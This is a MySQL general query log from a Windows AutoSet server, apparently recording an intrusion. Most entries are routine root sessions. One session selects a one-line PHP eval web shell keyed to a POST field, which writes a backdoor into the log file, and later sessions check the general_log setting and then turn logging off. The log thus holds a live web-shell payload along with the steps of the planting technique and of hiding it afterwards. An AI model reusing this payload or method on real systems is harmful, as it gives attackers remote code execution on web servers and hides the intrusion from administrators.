C:\AutoSet9\Server\MySQL5\bin\mysqld.exe, Version: 5.6.20 (MySQL Community Server (GPL)). started with:
TCP Port: 3306, Named Pipe: C:/AutoSet9/Server/temp/mysql.sock
Time                 Id Command    Argument
		  704 Quit	
181006  0:20:57	  705 Connect	root@localhost on 
		  705 Query	SET CHARACTER SET 'utf8mb4'
		  705 Query	SET collation_connection = 'utf8mb4_general_ci'
		  705 Init DB	mysql
		  705 Query	SHOW MASTER LOGS
		  705 Quit	
181006  0:20:59	  706 Connect	root@localhost on 
		  706 Query	SET CHARACTER SET 'utf8mb4'
		  706 Query	SET collation_connection = 'utf8mb4_general_ci'
		  706 Query	SELECT '<?php @eval($_POST["qwer"]);?>'
		  706 Query	SHOW VARIABLES LIKE 'profiling'
		  706 Quit	
181006  0:41:09	  707 Connect	root@localhost on 
		  707 Query	SET CHARACTER SET 'utf8mb4'
		  707 Query	SET collation_connection = 'utf8mb4_general_ci'
		  707 Init DB	mysql
		  707 Query	SHOW SESSION VARIABLES
		  707 Query	SHOW GLOBAL VARIABLES
		  707 Query	SHOW MASTER LOGS
		  707 Quit	
181006  0:41:25	  708 Connect	root@localhost on 
		  708 Query	SET CHARACTER SET 'utf8mb4'
		  708 Query	SET collation_connection = 'utf8mb4_general_ci'
		  708 Init DB	mysql
		  708 Query	SHOW GLOBAL VARIABLES WHERE Variable_name="general_log"
		  708 Quit	
181006  0:41:27	  709 Connect	root@localhost on 
		  709 Query	SET CHARACTER SET 'utf8mb4'
		  709 Query	SET collation_connection = 'utf8mb4_general_ci'
		  709 Init DB	mysql
		  709 Query	SET GLOBAL general_log = 'off'
